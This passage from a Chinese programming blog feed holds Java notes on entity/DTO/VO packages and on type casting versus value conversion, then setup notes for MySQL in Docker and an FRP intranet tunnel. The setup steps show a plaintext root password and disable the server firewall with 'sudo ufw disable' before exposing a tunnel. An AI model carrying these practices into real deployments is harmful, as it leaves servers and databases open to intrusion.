总结一下区别（通俗表格版）</h2><table><thead><tr><th>类别</th><th>是否与数据库映射</th><th>是否有注解</th><th>是否只存数据</th><th>是否参与逻辑</th><th>典型用途</th></tr></thead><tbody><tr><td>普通类</td><td>❌</td><td>❌</td><td>❌</td><td>✅</td><td>业务逻辑、工具类</td></tr><tr><td>POJO</td><td>❌</td><td>❌</td><td>✅</td><td>❌</td><td>数据结构</td></tr><tr><td>Entity</td><td>✅</td><td>✅</td><td>✅</td><td>❌</td><td>ORM 映射</td></tr><tr><td>DTO &#x2F; VO等</td><td>❌</td><td>可选</td><td>✅</td><td>❌</td><td>传输或展示层数据</td></tr></tbody></table><hr><p>如果你以后写项目看到这些类名，不用懵逼，只要记住一个核心逻辑：</p><blockquote><p><strong>“类名&#x3D;职责”，职责不同，分类不同。写法差不多，作用不同。</strong></p></blockquote><p>需要我再结合 SpringBoot 或数据库项目做个类图例子的话，也可以继续说～</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.project</span><br>├── controller       <span class="hljs-comment">// 控制层</span><br>├── service          <span class="hljs-comment">// 服务层</span><br>│   └── impl<br>├── mapper           <span class="hljs-comment">// MyBatis 映射层</span><br>├── entity           <span class="hljs-comment">// 实体类（DO/PO）</span><br>├── dto              <span class="hljs-comment">// 请求参数类</span><br>├── vo               <span class="hljs-comment">// 返回视图类</span><br>├── bo               <span class="hljs-comment">// 业务逻辑对象</span><br>├── config           <span class="hljs-comment">// 配置类</span><br>├── utils            <span class="hljs-comment">// 工具类</span><br><br></code></pre></td></tr></table></figure><p>这个问题问得很好！<code>entity</code> 包到底应该放什么，是很多人项目分层时常常迷糊的一点。我们来一一分析这些类是否<strong>都应该放到 <code>entity</code> 包下</strong>。</p><hr><h3 id="1-✅-DO-PO（-Entity）"><a href="#1-✅-DO-PO（-Entity）" class="headerlink" title="1. ✅ DO &#x2F; PO（&#x3D; Entity）"></a>1. ✅ <code>DO</code> &#x2F; <code>PO</code>（&#x3D; Entity）</h3><ul><li><p><strong>是的！建议放在 <code>entity</code> 包里。</strong></p></li><li><p>因为这些类是直接和数据库中的表对应的实体类，本身就是 Entity，也叫 DO（Data Object）或 PO（Persistent Object），统一叫法因人而异。</p></li><li><p><strong>推荐包结构</strong>：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.project</span><span class="hljs-selector-class">.entity</span><br>com<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.project</span><span class="hljs-selector-class">.model</span>.entity<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="2-🚫-DTO（Data-Transfer-Object）"><a href="#2-🚫-DTO（Data-Transfer-Object）" class="headerlink" title="2. 🚫 DTO（Data Transfer Object）"></a>2. 🚫 <code>DTO</code>（Data Transfer Object）</h3><ul><li><p><strong>不建议放在 <code>entity</code> 包下。</strong></p></li><li><p>DTO 是前后端或服务之间传输用的数据对象，不直接代表数据库表。</p></li><li><p>通常放在 <code>dto</code> 包中：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.project</span>.dto<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="3-🚫-VO（View-Object）"><a href="#3-🚫-VO（View-Object）" class="headerlink" title="3. 🚫 VO（View Object）"></a>3. 🚫 <code>VO</code>（View Object）</h3><ul><li><p><strong>也不建议放在 <code>entity</code> 包下。</strong></p></li><li><p>VO 是返回给前端的视图数据结构，常常经过封装和脱敏，和数据库没有强关系。</p></li><li><p>通常放在 <code>vo</code> 包中：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.project</span>.vo<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="4-⚠️-BO（Business-Object）"><a href="#4-⚠️-BO（Business-Object）" class="headerlink" title="4. ⚠️ BO（Business Object）"></a>4. ⚠️ <code>BO</code>（Business Object）</h3><ul><li><p><strong>也不建议放在 <code>entity</code> 包下</strong>，但这个分类比较灵活。</p></li><li><p>BO 是业务中间态对象，一般存在于 service 层内部，用于辅助业务逻辑处理。</p></li><li><p>通常放在 <code>bo</code> 或 <code>domain.bo</code> 包中：</p>  <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.project</span><span class="hljs-selector-class">.bo</span><br>com<span class="hljs-selector-class">.xxx</span><span class="hljs-selector-class">.project</span><span class="hljs-selector-class">.domain</span>.bo<br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="✅-正确示例：常见的包结构推荐"><a href="#✅-正确示例：常见的包结构推荐" class="headerlink" title="✅ 正确示例：常见的包结构推荐"></a>✅ 正确示例：常见的包结构推荐</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.project</span><br>├── controller       <span class="hljs-comment">// 控制层</span><br>├── service          <span class="hljs-comment">// 服务层</span><br>│   └── impl<br>├── mapper           <span class="hljs-comment">// MyBatis 映射层</span><br>├── entity           <span class="hljs-comment">// 实体类（DO/PO）</span><br>├── dto              <span class="hljs-comment">// 请求参数类</span><br>├── vo               <span class="hljs-comment">// 返回视图类</span><br>├── bo               <span class="hljs-comment">// 业务逻辑对象</span><br>├── config           <span class="hljs-comment">// 配置类</span><br>├── utils            <span class="hljs-comment">// 工具类</span><br></code></pre></td></tr></table></figure><hr><h2 id="📝-小结：哪个类放哪个包？"><a href="#📝-小结：哪个类放哪个包？" class="headerlink" title="📝 小结：哪个类放哪个包？"></a>📝 小结：哪个类放哪个包？</h2><table><thead><tr><th>类名</th><th>包名推荐</th><th>是否能放 entity 包</th></tr></thead><tbody><tr><td>DO&#x2F;PO（Entity）</td><td><code>entity</code></td><td>✅ 是</td></tr><tr><td>DTO</td><td><code>dto</code></td><td>❌ 否</td></tr><tr><td>VO</td><td><code>vo</code></td><td>❌ 否</td></tr><tr><td>BO</td><td><code>bo</code> &#x2F; <code>domain.bo</code></td><td>❌ 否</td></tr></tbody></table><hr><p>如果你有一个前后端分离的 Spring Boot 项目，这样的分类和包结构能让代码更清晰、职责更明确，也便于团队协作。需要我帮你生成一个实际的包结构模板代码示例，也可以提一下～</p><h3 id="1-MySQL-数据类型"><a href="#1-MySQL-数据类型" class="headerlink" title="1. MySQL 数据类型"></a>1. MySQL 数据类型</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E4%BC%A0%E5%8F%82/image-20250412122816030.png"></p><p>简单类型、包装类、array、list、set、map、对象</p><p>参数类型可以根据实际需求灵活选择，包括简单类型（主要使用）、包装类、数组（Array）、集合类（List、Set、Map）、实体类对象（主要使用）以及其他普通对象等，均可作为参数传入。</p><p>无论方法中需要传递多少个参数，我们都<strong>推荐为每个参数显式使用 <code>@Param</code> 注解</strong>。这是 MyBatis 提供的注解，用于为传入 SQL 的参数命名，以确保 SQL 语句中能够准确引用对应参数，提升可读性和可维护性。</p><h1 id="数值转换和类型转换"><a href="#数值转换和类型转换" class="headerlink" title="数值转换和类型转换"></a>数值转换和类型转换</h1><p>非常经典的问题！这正好击中了 Java 类型系统的一个核心逻辑：<strong>“类型转换” ≠ “值转换”</strong>。</p><hr><h3 id="❓问题："><a href="#❓问题：" class="headerlink" title="❓问题："></a>❓问题：</h3><p>为什么不能把 <code>String</code> 类型（如 <code>&quot;123&quot;</code>）强制转换为 <code>Integer</code> 类型？</p><p>比如你想这样做：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123&quot;</span>;<br><span class="hljs-type">Integer</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> (Integer) str; <span class="hljs-comment">// ❌ 会抛出 ClassCastException</span><br></code></pre></td></tr></table></figure><hr><h3 id="✅-原因解释："><a href="#✅-原因解释：" class="headerlink" title="✅ 原因解释："></a>✅ 原因解释：</h3><p>Java 的<strong>强制类型转换（cast）</strong>只能在<strong>存在继承关系或实现关系的类型之间进行转换</strong>，而 <strong><code>String</code> 和 <code>Integer</code> 完全没有任何继承或实现关系</strong>，只是看起来值可以转，其实类型完全无关。</p><p>更重要的是：</p><blockquote><p>Java 的类型转换只转换“引用的类型标识”，<strong>不转换值的内部结构</strong>。</p></blockquote><p>也就是说：<br>你用 <code>(Integer)</code> 去转换一个 <code>&quot;123&quot;</code>，你只是“骗”JVM说它是 Integer，<br>但它<strong>骨子里还是个 String 对象</strong>，JVM 一看你说谎了，直接甩你个 <code>ClassCastException</code>。</p><hr><h3 id="🍐通俗对比一下："><a href="#🍐通俗对比一下：" class="headerlink" title="🍐通俗对比一下："></a>🍐通俗对比一下：</h3><p>你有一张写着“123”的便利贴（String），你不能直接把它扔进计算器当数字（Integer）去加减。<br>你必须先 <strong>读出上面的数字内容</strong>，再用代码把它变成数字。</p><hr><h3 id="✅-正确做法是值转换，不是类型转换："><a href="#✅-正确做法是值转换，不是类型转换：" class="headerlink" title="✅ 正确做法是值转换，不是类型转换："></a>✅ 正确做法是值转换，不是类型转换：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123&quot;</span>;<br><span class="hljs-type">Integer</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> Integer.parseInt(str); <span class="hljs-comment">// ✅ OK！值转换</span><br></code></pre></td></tr></table></figure><p>这个时候你调用的是 <code>Integer.parseInt()</code>，它内部会：</p><ul><li><p>解析这个字符串里的数字</p></li><li><p>创建一个新的 Integer 类型的值返回给你</p></li></ul><p>这才是“把字符串转换为整数”的正确方式。</p><hr><h3 id="总结关键点："><a href="#总结关键点：" class="headerlink" title="总结关键点："></a>总结关键点：</h3><table><thead><tr><th>概念</th><th>是否可行</th><th>原因说明</th></tr></thead><tbody><tr><td><code>(Integer) &quot;123&quot;</code></td><td>❌ 不行</td><td>类型完全无关，强转会抛异常</td></tr><tr><td><code>Integer.parseInt(&quot;123&quot;)</code></td><td>✅ 可以</td><td>这是值的解析转换，得到新对象，不涉及类型欺骗</td></tr></tbody></table><hr><h3 id="🧠一句话总结："><a href="#🧠一句话总结：" class="headerlink" title="🧠一句话总结："></a>🧠一句话总结：</h3><blockquote><p><strong>强制类型转换只能在兼容的类型之间玩“身份伪装”；不兼容的类型，需要用“值转换”重新创建一个新对象。</strong></p></blockquote><p>要不要我再给你列一个常见“值转换 vs 类型转换”的对照表？非常适合记忆和面试用。</p><p>哈哈哈你这表情我笑出了声 😂</p><p>别急，咱们现在是站在 <strong>Java 类型系统和 JVM 运行时的视角</strong>上讲“强制类型转换”，和你之前学的“Java 基础里的类型转换”其实讲的是<strong>两件事</strong>，只是名字听起来像是一个东西。</p><p>我现在就来给你拆开讲清楚：</p><hr><h2 id="🍰-Java-里其实有-两种类型转换"><a href="#🍰-Java-里其实有-两种类型转换" class="headerlink" title="🍰 Java 里其实有 两种类型转换"></a>🍰 Java 里其实有 <strong>两种类型转换</strong></h2><table><thead><tr><th>类型转换类别</th><th>示例</th><th>能不能用</th><th>属于哪一类？</th></tr></thead><tbody><tr><td><strong>值转换（value conversion）</strong></td><td><code>int → String</code>，<code>String → int</code></td><td>✅ 可以</td><td>通过 API、解析等</td></tr><tr><td><strong>类型转换（type cast）</strong></td><td><code>(Integer) obj</code>，<code>(Dog) animal</code></td><td>⚠ 有条件</td><td>运行时类型检查</td></tr></tbody></table><hr><h3 id="✨-第一种：值转换-——-非常灵活，你之前学的就是这个！"><a href="#✨-第一种：值转换-——-非常灵活，你之前学的就是这个！" class="headerlink" title="✨ 第一种：值转换 —— 非常灵活，你之前学的就是这个！"></a>✨ 第一种：值转换 —— 非常灵活，你之前学的就是这个！</h3><p>比如这些都没问题：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">int</span> <span class="hljs-built_in">num</span> = <span class="hljs-number">123</span>;<br><span class="hljs-built_in">String</span> str = <span class="hljs-built_in">String</span>.valueOf(<span class="hljs-built_in">num</span>);          <span class="hljs-comment">// int → String ✅</span><br><span class="hljs-built_in">int</span> num2 = Integer.parseInt(<span class="hljs-string">&quot;456&quot;</span>);        <span class="hljs-comment">// String → int ✅</span><br><span class="hljs-built_in">double</span> d = <span class="hljs-number">3.14</span>;<br><span class="hljs-built_in">int</span> i = (<span class="hljs-built_in">int</span>) d;                           <span class="hljs-comment">// double → int ✅（精度丢失也认了）</span><br></code></pre></td></tr></table></figure><p>这些转换依赖于：</p><ul><li><p>Java 的自动拆装箱</p></li><li><p><code>valueOf()</code> &#x2F; <code>parseXxx()</code> 之类的方法</p></li><li><p>基本类型间的自动或强制转换</p></li></ul><p><strong>👉 所以你学的没错，它们一直都能用，而且你以后写业务代码也一直会用。</strong></p><hr><h3 id="💥-第二种：强制类型转换（Type-Cast）——-你现在遇到的就是它"><a href="#💥-第二种：强制类型转换（Type-Cast）——-你现在遇到的就是它" class="headerlink" title="💥 第二种：强制类型转换（Type Cast）—— 你现在遇到的就是它"></a>💥 第二种：强制类型转换（Type Cast）—— 你现在遇到的就是它</h3><p>这个转换发生在 <strong>引用类型（对象）之间</strong>，要求它们有继承或实现关系。</p><p>比如：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Object obj <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abc&quot;</span><span class="hljs-comment">;</span><br>String s <span class="hljs-operator">=</span> (String) obj<span class="hljs-comment">; // ✅ OK，因为实际是 String</span><br></code></pre></td></tr></table></figure><p>但这就不行：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Object obj <span class="hljs-operator">=</span> <span class="hljs-string">&quot;123&quot;</span><span class="hljs-comment">;</span><br>Integer i <span class="hljs-operator">=</span> (Integer) obj<span class="hljs-comment">; // ❌ 报错！ClassCastException</span><br></code></pre></td></tr></table></figure><p>因为：</p><ul><li><p><code>&quot;123&quot;</code> 是个 String 实例</p></li><li><p>你硬说它是 Integer</p></li><li><p>JVM：我信你个鬼！</p></li></ul><hr><h2 id="🧠-总结一下你之前学的是啥、现在学的是啥："><a href="#🧠-总结一下你之前学的是啥、现在学的是啥：" class="headerlink" title="🧠 总结一下你之前学的是啥、现在学的是啥："></a>🧠 总结一下你之前学的是啥、现在学的是啥：</h2><table><thead><tr><th>场景</th><th>是否可靠</th><th>属于哪类</th><th>例子</th></tr></thead><tbody><tr><td><code>int ↔ String</code></td><td>✅ 稳</td><td>值转换</td><td><code>String.valueOf(123)</code> &#x2F; <code>Integer.parseInt(&quot;123&quot;)</code></td></tr><tr><td><code>double → int</code></td><td>✅ 可控</td><td>值转换</td><td><code>(int) 3.14</code>（截断为 3）</td></tr><tr><td><code>Object → String</code>（真实是 String）</td><td>✅ 可</td><td>类型转换</td><td><code>(String) obj</code>（obj 是 String）</td></tr><tr><td><code>Object → Integer</code>（实际是 String）</td><td>❌ 报错</td><td>类型转换</td><td><code>(Integer) &quot;123&quot;</code> 报 ClassCastException</td></tr></tbody></table><hr><h3 id="😂-所以，不是我推翻了你学的，是你现在进阶了"><a href="#😂-所以，不是我推翻了你学的，是你现在进阶了" class="headerlink" title="😂 所以，不是我推翻了你学的，是你现在进阶了"></a>😂 所以，不是我推翻了你学的，是你现在<strong>进阶了</strong></h3><p>以前学的是 <strong>“基础的值转换”</strong>，现在学的是 <strong>“对象之间的类型转换和它的陷阱”</strong>。</p><p>Java 从来没骗你，只是你现在从玩积木的阶段，走到开始调电路板的阶段了。</p><hr><p>要不要我整理一个“值转换 vs 类型转换”的脑图或对照表，方便你彻底掌握这俩的边界？</p><p>你这个问题问得太好了！这是通往“Java类型系统本质理解”的必经之路。</p><p>我们就来讲讲：</p><hr><h2 id="🌟-一、值转换-vs-类型转换：核心区别"><a href="#🌟-一、值转换-vs-类型转换：核心区别" class="headerlink" title="🌟 一、值转换 vs 类型转换：核心区别"></a>🌟 一、值转换 vs 类型转换：核心区别</h2><table><thead><tr><th>项目</th><th><strong>值转换（Value Conversion）</strong></th><th><strong>类型转换（Type Cast）</strong></th></tr></thead><tbody><tr><td><strong>发生在哪些类型</strong></td><td><strong>基本数据类型</strong>（int、double等）和部分引用类型（如String）</td><td><strong>引用类型之间</strong>（类、接口、数组）</td></tr><tr><td><strong>有没有继承关系要求</strong></td><td>❌ 没有，比如 String → int 都不是一个体系</td><td>✅ 必须有继承或实现关系（否则直接抛 <code>ClassCastException</code>）</td></tr><tr><td><strong>是否改变对象本身</strong></td><td>✅ 会创建新值或新对象（比如把 “123” 变成数字 123）</td><td>❌ 只是更改“引用的视角”，对象本身不变</td></tr><tr><td><strong>是否可能失败</strong></td><td>✅ 可能失败（如 “abc” → int）</td><td>✅ 更容易失败（你说它是 Integer，结果其实是 String）</td></tr><tr><td><strong>实现方式</strong></td><td>调用方法（如 <code>parseXxx()</code>、<code>valueOf()</code>）、运算符等</td><td>使用 <code>(Type)</code> 明确强转操作</td></tr><tr><td><strong>举个例子</strong></td><td><code>Integer.parseInt(&quot;123&quot;)</code></td><td><code>(Animal) obj</code></td></tr></tbody></table><hr><h2 id="🧩-二、你的“Java类型分类”与这两种转换的关系："><a href="#🧩-二、你的“Java类型分类”与这两种转换的关系：" class="headerlink" title="🧩 二、你的“Java类型分类”与这两种转换的关系："></a>🧩 二、你的“Java类型分类”与这两种转换的关系：</h2><p>你说得很对，Java 的类型体系大致可以分为：</p><table><thead><tr><th>类别</th><th>举例</th><th>相关的转换方式说明</th></tr></thead><tbody><tr><td><strong>基本数据类型</strong></td><td><code>int</code>、<code>double</code>、<code>char</code></td><td>✅ 主要使用“值转换”：自动&#x2F;强制、类型提升等</td></tr><tr><td><strong>类（Class）</strong></td><td><code>String</code>、<code>Integer</code>、<code>Object</code> 等</td><td>✅ 支持类型转换（cast）✅ 一些类支持值转换方法，如 <code>parseInt()</code></td></tr><tr><td><strong>接口（Interface）</strong></td><td><code>List</code>、<code>Runnable</code> 等</td><td>✅ 可以类型转换（cast）为接口或由接口转为实现类</td></tr><tr><td><strong>数组</strong></td><td><code>int[]</code>、<code>String[]</code></td><td>✅ 也支持类型转换（<code>Object[]</code> → <code>String[]</code>）</td></tr><tr><td><strong>集合框架类</strong></td><td><code>List</code>、<code>Set</code>、<code>Map</code></td><td>✅ 类型转换只适用于引用转换，如 <code>(List&lt;?&gt;) obj</code>❌ 元素类型不能用强转处理，需要值转换或泛型</td></tr></tbody></table><hr><h3 id="✅-举个通俗例子来串起来："><a href="#✅-举个通俗例子来串起来：" class="headerlink" title="✅ 举个通俗例子来串起来："></a>✅ 举个通俗例子来串起来：</h3><p>你有一盒杂物（<code>Object[]</code>），里面有：</p><ul><li><p>数字（<code>Integer</code>）</p></li><li><p>文字（<code>String</code>）</p></li><li><p>清单（<code>List&lt;String&gt;</code>）</p></li></ul><p>你：</p><ul><li><p>想拿出“123”这个字符串并变成数字 → <strong>值转换：<code>Integer.parseInt(&quot;123&quot;)</code></strong></p></li><li><p>想从盒子里把“我知道是 List”拿出来 → <strong>类型转换：<code>(List&lt;String&gt;) obj</code></strong></p></li><li><p>想从一个 <code>int</code> 自动变成 <code>double</code> → <strong>自动值转换（类型提升）</strong></p></li><li><p>想把 <code>double</code> 转成 <code>int</code> → <strong>强制值转换（可能精度丢失）</strong></p></li><li><p>想把一个 <code>String</code> 强转为 <code>Integer</code> → ❌ <strong>类型转换失败，直接崩</strong></p></li></ul><hr><h2 id="🧠-总结一口气说清楚："><a href="#🧠-总结一口气说清楚：" class="headerlink" title="🧠 总结一口气说清楚："></a>🧠 总结一口气说清楚：</h2><blockquote><p><strong>值转换，是“你拿一个值出来，重新做一个值”；类型转换，是“你告诉 JVM：这东西我知道它其实是什么类型”。</strong></p></blockquote><p>它们和你说的这些 Java 类型种类都有关系：</p><ul><li><p>基本类型 → 值转换为主</p></li><li><p>类、接口、数组 → 类型转换为主，也可能提供值转换方法</p></li></ul><hr><p>要不要我画个图表或者整理一个“Java 类型 × 转换方式”的全景对照图？对这种逻辑性超强的你来说应该很爽 😄</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>Java 基础</category>
      
      <category>Java 数据类型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：搭建 MySQL 环境</title>
    <link href="/2025/06/29/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%90%AD%E5%BB%BA%20MySQL%20%E7%8E%AF%E5%A2%83/"/>
    <url>/2025/06/29/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%90%AD%E5%BB%BA%20MySQL%20%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h2 id="单机测试环境"><a href="#单机测试环境" class="headerlink" title="单机测试环境"></a>单机测试环境</h2><h3 id="Docker-环境部署"><a href="#Docker-环境部署" class="headerlink" title="Docker 环境部署"></a>Docker 环境部署</h3><p><span style="background:#fff88f">1. 创建宿主机数据挂载目录</span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /mystudy/data/mysql<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2.启动 MySQL 容器</span></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -d <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --name my_mysql <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -p <span class="hljs-number">3306</span>:<span class="hljs-number">3306</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -e MYSQL_ROOT_PASSWORD=wq666666 <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  -v /mystudy/data/mysql:/var/lib/mysql <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  mysql:<span class="hljs-number">8</span>.<span class="hljs-number">0</span> <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --character-set-server=utf8mb4 <span class="hljs-punctuation">\</span><br><span class="hljs-punctuation"></span>  --collation-server=utf8mb4_unicode_ci<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>安装 Docker 时虽然已配置 Docker 代理，但这里任然需要配置命令行代理，因为需要与对应网站进行 TLS 握手</li><li>不要忘记将网络设置为我们设置的 Docker 代理的网络</li></ol></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">http_proxy</span>=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">https_proxy</span>=<span class="hljs-string">&quot;http://172.20.10.3:7890&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">no_proxy</span>=<span class="hljs-string">&quot;localhost,127.0.0.1,.svc,.cluster.local,192.168.136.0/24,10.96.0.1,10.244.0.0/16&quot;</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-variable">$http_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-variable">$https_proxy</span> &amp;&amp; <span class="hljs-built_in">export</span> <span class="hljs-attribute">NO_PROXY</span>=<span class="hljs-variable">$no_proxy</span><br></code></pre></td></tr></table></figure><hr>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>关系型数据库</category>
      
      <category>MySQL</category>
      
      <category>搭建 MySQL 环境</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：FRP 内网穿透</title>
    <link href="/2025/06/24/%E7%AC%94%E8%AE%B0%EF%BC%9AFRP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    <url>/2025/06/24/%E7%AC%94%E8%AE%B0%EF%BC%9AFRP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/RP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20250624100920194.png"></p><p><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/RP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20250624100936818.png"></p><h2 id="FRPS-端（云服务器端）"><a href="#FRPS-端（云服务器端）" class="headerlink" title="FRPS 端（云服务器端）"></a>FRPS 端（云服务器端）</h2><h3 id="创建-mystudy-frp-目录"><a href="#创建-mystudy-frp-目录" class="headerlink" title="创建 mystudy&#x2F;frp 目录"></a>创建 mystudy&#x2F;frp 目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /mystudy/frp<br></code></pre></td></tr></table></figure><hr><h3 id="下载并安装-FRP-Linux"><a href="#下载并安装-FRP-Linux" class="headerlink" title="下载并安装 FRP Linux"></a>下载并安装 FRP Linux</h3><p><span style="background:#fff88f">1. 下载 FRP 服务端</span><br>从 <a href="https://github.com/fatedier/frp/releases">FRP 服务端下载地址</a>下载 FRP 服务端安装包：<br><img src="/2025/05/12/%E6%9C%AA%E5%91%BD%E5%90%8D/RP%20%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20250624101633939.png"></p><blockquote><p>[!NOTE] 注意事项</p><ol><li>下载前请确认服务器架构，x86_64 需下载 linux_amd64，aarch64 需下载 linux_arm64</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">uname</span> -m<br></code></pre></td></tr></table></figure><p><span style="background:#fff88f">2. 安装 FRP Linux</span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 将 FRP 服务端安装包上传至 /mystudy/frp 目录</span><br><br><br><span class="hljs-comment"># 2. 进入 /mystudy/fro 目录</span><br><span class="hljs-built_in">cd</span> /mystudy/frp<br><br><br><span class="hljs-comment"># 3. 删除已存在 FRP 目录</span><br><span class="hljs-built_in">rm</span> -rf /mystudy/frp/frp<br><br><br><span class="hljs-comment"># 4. 解压</span><br>tar -zxvf  frp_0.62.1_linux_amd64.tar.gz -C /mystudy/frp<br><br><br><span class="hljs-comment"># 5. 重命名</span><br><span class="hljs-built_in">mv</span> frp_0.62.1_linux_amd64 frp<br></code></pre></td></tr></table></figure><hr><h3 id="启动-FRPS-端"><a href="#启动-FRPS-端" class="headerlink" title="启动 FRPS 端"></a>启动 FRPS 端</h3><h4 id="关闭防火墙-开启-7000-端口"><a href="#关闭防火墙-开启-7000-端口" class="headerlink" title="关闭防火墙 &#x2F; 开启 7000 端口"></a>关闭防火墙 &#x2F; 开启 7000 端口</h4><h5 id="关闭本地防火墙"><a href="#关闭本地防火墙" class="headerlink" title="关闭本地防火墙"></a>关闭本地防火墙</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> ufw <span class="hljs-built_in">disable</span><br></code></pre></td></tr></table></figure><hr><h5 id="关闭云服务商防火墙"><a 